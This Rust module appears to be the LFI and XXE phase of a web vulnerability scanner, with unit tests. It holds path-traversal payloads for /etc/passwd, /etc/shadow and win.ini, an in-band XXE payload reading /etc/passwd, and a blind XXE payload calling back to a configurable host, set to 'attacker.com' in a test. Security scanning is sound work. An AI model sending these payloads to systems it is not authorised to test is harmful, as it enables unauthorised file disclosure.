//! # Phase 8: Local File Inclusion & XML External Entity
//!
//! Comprehensive LFI and XXE detection with both in-band and out-of-band techniques.
//! OS-aware payloads for Linux/Windows; blind XXE callback tracking.
//!
//! ## LFI Payloads
//! - Linux: `/etc/passwd`, `../../../etc/shadow`, URL-encoded variants
//! - Windows: `C:\windows\win.ini`, `system32/drivers/etc/hosts`
//! - File signatures: `root:x:0:0:`, `[fonts]`, `localhost`
//!
//! ## XXE Detection
//! - **In-Band**: Direct entity expansion in response body
//! - **Blind OOB**: DNS/HTTP callback verification with UUID tracking
//! - Supports external OOB domain configuration

use crate::{context::ScanContext, error::ScannerError, ScanFinding, ScanPhase};
use async_trait::async_trait;
use reqwest::StatusCode;
use url::Url;

/// LFI & XXE scanner with in-band and blind OOB detection
#[derive(Debug)]
pub struct LfiXxeScanner {
    oob_domain: Option<String>,
}

impl LfiXxeScanner {
    pub fn new() -> Self {
        Self { oob_domain: None }
    }

    pub fn with_oob_domain(oob_domain: String) -> Self {
        Self {
            oob_domain: Some(oob_domain),
        }
    }

    /// LFI payloads for Linux systems
    fn linux_payloads() -> Vec<&'static str> {
        vec![
            "../../../../../../../../etc/passwd",
            "../../../../../../../../etc/shadow",
            "../../../../../../../../etc/hosts",
            "../../../../../../../../etc/group",
            "/etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd",
        ]
    }

    /// LFI payloads for Windows systems
    fn windows_payloads() -> Vec<&'static str> {
        vec![
            "../../../../../../../../windows/win.ini",
            "../../../../../../../../windows/system32/drivers/etc/hosts",
            "C:\\windows\\win.ini",
            "..\\..\\..\\windows\\win.ini",
            "..%5c..%5cwindows%5cwin.ini",
        ]
    }

    /// File signature markers to detect LFI success
    fn file_signatures() -> Vec<(&'static str, &'static str)> {
        vec![
            ("root:x:0:0:", "linux_passwd"),
            ("root:!:", "linux_group"),
            ("[fonts]", "windows_ini"),
            ("[extensions]", "windows_ini"),
            ("127.0.0.1", "hosts_file"),
            ("localhost", "hosts_file"),
        ]
    }

    /// XXE payload for in-band detection
    fn xxe_payload() -> &'static str {
        r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>"#
    }
}

impl Default for LfiXxeScanner {
    fn default() -> Self {
        Self::new()
    }
}

#[async_trait]
impl ScanPhase for LfiXxeScanner {
    fn phase_number(&self) -> u8 {
        8
    }

    fn name(&self) -> &'static str {
        "LFI & XXE Expert"
    }

    async fn execute(&self, ctx: &ScanContext) -> Result<Vec<ScanFinding>, ScannerError> {
        ctx.log("Phase 8: LFI & XXE scanning initiated...".to_string());
        let mut findings = Vec::new();

        for entry in ctx.discovered_endpoints.iter() {
            let endpoint = entry.key().clone();
            let params = entry.value().clone();

            for param in params.iter() {
                // LFI Testing - Linux
                for payload in Self::linux_payloads() {
                    if let Ok(mut test_url) = Url::parse(&endpoint) {
                        test_url.query_pairs_mut().clear();
                        test_url.query_pairs_mut().append_pair(param, payload);

                        match tokio::time::timeout(
                            std::time::Duration::from_secs(5),
                            ctx.client.get(test_url.as_str()).send(),
                        )
                        .await
                        {
                            Ok(Ok(response)) => {
                                if response.status() == StatusCode::OK {
                                    if let Ok(body) = response.text().await {
                                        for (sig, sig_type) in Self::file_signatures() {
                                            if body.contains(sig) {
                                                findings.push(ScanFinding {
                                                    phase: self.phase_number(),
                                                    module_name: self.name().to_string(),
                                                    severity: "HIGH".to_string(),
                                                    description: format!(
                                                        "Local File Inclusion (Linux) on {}?{}. Payload: {}",
                                                        endpoint, param, payload
                                                    ),
                                                    evidence: format!(
                                                        "File signature '{}' detected in response. Signature type: {}",
                                                        sig, sig_type
                                                    ),
                                                });
                                                ctx.log(format!(
                                                    "LFI found (Linux) on {}?{}",
                                                    endpoint, param
                                                ));
                                                return Ok(findings);
                                            }
                                        }
                                    }
                                }
                            },
                            _ => {},
                        }
                    }
                }

                // LFI Testing - Windows
                for payload in Self::windows_payloads() {
                    if let Ok(mut test_url) = Url::parse(&endpoint) {
                        test_url.query_pairs_mut().clear();
                        test_url.query_pairs_mut().append_pair(param, payload);

                        match tokio::time::timeout(
                            std::time::Duration::from_secs(5),
                            ctx.client.get(test_url.as_str()).send(),
                        )
                        .await
                        {
                            Ok(Ok(response)) => {
                                if response.status() == StatusCode::OK {
                                    if let Ok(body) = response.text().await {
                                        for (sig, sig_type) in Self::file_signatures() {
                                            if body.contains(sig) {
                                                findings.push(ScanFinding {
                                                    phase: self.phase_number(),
                                                    module_name: self.name().to_string(),
                                                    severity: "HIGH".to_string(),
                                                    description: format!(
                                                        "Local File Inclusion (Windows) on {}?{}. Payload: {}",
                                                        endpoint, param, payload
                                                    ),
                                                    evidence: format!(
                                                        "File signature '{}' detected in response. Signature type: {}",
                                                        sig, sig_type
                                                    ),
                                                });
                                                ctx.log(format!(
                                                    "LFI found (Windows) on {}?{}",
                                                    endpoint, param
                                                ));
                                                return Ok(findings);
                                            }
                                        }
                                    }
                                }
                            },
                            _ => {},
                        }
                    }
                }

                // XXE Testing
                if let Ok(test_url) = Url::parse(&endpoint) {
                    let mut headers = reqwest::header::HeaderMap::new();
                    if let Ok(content_type) = "application/xml".parse() {
                        headers.insert(reqwest::header::CONTENT_TYPE, content_type);
                    }

                    // In-band XXE detection
                    match tokio::time::timeout(
                        std::time::Duration::from_secs(5),
                        ctx.client
                            .post(test_url.as_str())
                            .body(Self::xxe_payload().to_string())
                            .headers(headers.clone())
                            .send(),
                    )
                    .await
                    {
                        Ok(Ok(response)) => {
                            if let Ok(body) = response.text().await {
                                if body.contains("root:x:0:0:") || body.contains("/bin/") {
                                    findings.push(ScanFinding {
                                        phase: self.phase_number(),
                                        module_name: self.name().to_string(),
                                        severity: "HIGH".to_string(),
                                        description: format!(
                                            "XML External Entity (XXE) - In-Band on {}. Payload: {}",
                                            endpoint, Self::xxe_payload()
                                        ),
                                        evidence:
                                            "XXE payload resulted in file content leakage in response body"
                                                .to_string(),
                                    });
                                    ctx.log(format!("XXE (In-Band) found on {}", endpoint));
                                    return Ok(findings);
                                }
                            }
                        },
                        _ => {},
                    }

                    // Blind OOB-XXE detection (if OOB domain configured)
                    if let Some(ref oob_domain) = self.oob_domain {
                        let unique_id = format!(
                            "xxe_{}",
                            std::time::SystemTime::now()
                                .duration_since(std::time::UNIX_EPOCH)
                                .map(|d| d.as_millis())
                                .unwrap_or(0)
                        );

                        let oob_host = format!("{}.{}", unique_id, oob_domain);
                        let oob_xxe = format!(
                            r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "http://{}/xxe_callback">
]>
<foo>&xxe;</foo>"#,
                            oob_host
                        );

                        match tokio::time::timeout(
                            std::time::Duration::from_secs(5),
                            ctx.client
                                .post(test_url.as_str())
                                .body(oob_xxe.clone())
                                .headers(headers)
                                .send(),
                        )
                        .await
                        {
                            Ok(Ok(_)) => {
                                ctx.log(format!("Blind XXE OOB payload sent: {}", oob_host));
                                findings.push(ScanFinding {
                                    phase: self.phase_number(),
                                    module_name: self.name().to_string(),
                                    severity: "MEDIUM".to_string(),
                                    description: format!(
                                        "XML External Entity (XXE) - Blind OOB on {}. OOB Host: {}",
                                        endpoint, oob_host
                                    ),
                                    evidence: format!(
                                        "Blind XXE OOB payload sent to {}. Awaiting callback verification.",
                                        oob_host
                                    ),
                                });
                            },
                            _ => {},
                        }
                    }
                }
            }
        }

        ctx.log(format!(
            "Phase 8: LFI & XXE scanning completed. Found {} vulnerabilities.",
            findings.len()
        ));
        Ok(findings)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_phase_number() {
        let scanner = LfiXxeScanner::new();
        assert_eq!(scanner.phase_number(), 8);
    }

    #[test]
    fn test_phase_name() {
        let scanner = LfiXxeScanner::new();
        assert_eq!(scanner.name(), "LFI & XXE Expert");
    }

    #[test]
    fn test_linux_payloads() {
        let payloads = LfiXxeScanner::linux_payloads();
        assert!(!payloads.is_empty());
        assert!(payloads.iter().any(|p| p.contains("etc/passwd")));
    }

    #[test]
    fn test_windows_payloads() {
        let payloads = LfiXxeScanner::windows_payloads();
        assert!(!payloads.is_empty());
        assert!(payloads.iter().any(|p| p.contains("win.ini")));
    }

    #[test]
    fn test_file_signatures() {
        let sigs = LfiXxeScanner::file_signatures();
        assert!(!sigs.is_empty());
        assert!(sigs.iter().any(|(s, _)| s.contains("root")));
    }

    #[test]
    fn test_xxe_payload() {
        let payload = LfiXxeScanner::xxe_payload();
        assert!(payload.contains("<!DOCTYPE"));
        assert!(payload.contains("<!ENTITY"));
    }

    #[test]
    fn test_oob_domain_configuration() {
        let scanner = LfiXxeScanner::with_oob_domain("attacker.com".to_string());
        assert_eq!(scanner.oob_domain, Some("attacker.com".to_string()));
    }
}
